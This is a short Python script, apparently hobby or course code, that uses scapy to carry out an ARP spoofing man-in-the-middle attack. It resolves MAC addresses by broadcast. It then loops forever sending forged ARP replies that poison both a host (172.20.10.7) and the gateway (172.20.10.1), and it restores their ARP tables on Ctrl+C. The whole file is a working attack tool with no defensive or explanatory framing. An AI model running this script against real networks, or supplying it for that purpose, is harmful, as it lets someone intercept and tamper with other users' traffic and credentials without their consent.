import  scapy.all as scapy
import time
import sys
def scan(ip):
    answered_list = []
  
    arp_request = scapy.ARP()
    arp_request.pdst = ip
    broadcast = scapy.Ether()
 
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = broadcast/arp_request
    answered_list =  scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]

    return answered_list[0][1].hwsrc   
     
  


        




#pdst is target ip
#op is operation 1=request, 2=response
#hwdst is target hardware address
#psrc is router ip

def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())

    scapy.send(packet, verbose = False)


#print(packet.show())
#print(packet.summary())

def restore(dest_ip, source_ip):
    dest_mac = scan(dest_ip)
    sour_mac= scan(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc= sour_mac)
    scapy.send(packet,count=4,  verbose= False)


sent_packets_count = 0
try:
    while True:


        spoof("172.20.10.7", "172.20.10.1")
        spoof("172.20.10.1", "172.20.10.7")
        sent_packets_count = sent_packets_count + 2
        print("\r packet sent " + str(sent_packets_count), end=" ")
        sys.stdout.flush()

        time.sleep(2)
except KeyboardInterrupt:
    print(" detected CTRL+C .... Quitting.. and rese tting")
    restore("172.20.10.7", "172.20.10.1")
    restore("172.20.10.1","172.20.10.7")

    
      